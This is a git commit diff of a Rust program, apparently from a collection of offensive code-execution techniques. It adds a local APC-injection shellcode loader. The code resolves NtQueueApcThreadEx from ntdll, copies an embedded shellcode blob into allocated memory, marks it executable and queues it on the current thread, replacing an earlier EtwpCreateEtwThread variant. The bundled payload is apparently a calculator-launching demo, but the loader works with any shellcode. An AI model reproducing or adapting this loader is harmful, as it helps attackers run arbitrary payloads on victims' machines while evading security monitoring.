5f871b9fa4cf1bdbac67bb705e8f34cdf7198f57
test <test@test.com>
2023-03-21 07:45:58 -0700

    add nt_queue_apc_thread_ex_local

--- nt_queue_apc_thread_ex_local/src/main.rs
+++ nt_queue_apc_thread_ex_local/src/main.rs
@@ -3,12 +3,12 @@
 use std::ffi::c_void;
 use std::mem::transmute;
 use std::ptr::{copy, null, null_mut};
-use windows_sys::Win32::Foundation::{FALSE, HANDLE, WAIT_FAILED};
+use windows_sys::Win32::Foundation::{FALSE, HANDLE};
 use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
 use windows_sys::Win32::System::Memory::{
     VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
 };
-use windows_sys::Win32::System::Threading::WaitForSingleObject;
+use windows_sys::Win32::System::Threading::GetCurrentThread;
 
 static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
 static SIZE: usize = SHELLCODE.len();
@@ -19,15 +19,11 @@ fn main() {
 
     unsafe {
         let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr());
-        if ntdll == 0 {
-            eprintln!("LoadLibraryA failed!");
-            return;
-        }
 
-        let fn_etwp_create_etw_thread = GetProcAddress(ntdll, "EtwpCreateEtwThread\0".as_ptr());
+        let fn_nt_queue_apc_thread_ex = GetProcAddress(ntdll, "NtQueueApcThreadEx\0".as_ptr());
 
-        let etwp_create_etw_thread: extern "C" fn(*mut c_void, isize) -> HANDLE =
-            transmute(fn_etwp_create_etw_thread);
+        let nt_queue_apc_thread_ex: extern "C" fn(HANDLE, isize, *mut c_void, isize, isize, isize) =
+            transmute(fn_nt_queue_apc_thread_ex);
 
         let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if dest == null_mut() {
@@ -43,8 +39,8 @@ fn main() {
             return;
         }
 
-        let thread = etwp_create_etw_thread(dest, 0);
+        let handle = GetCurrentThread();
 
-        WaitForSingleObject(thread, WAIT_FAILED);
+        nt_queue_apc_thread_ex(handle, 1, dest, 0, 0, 0);
     }
 }
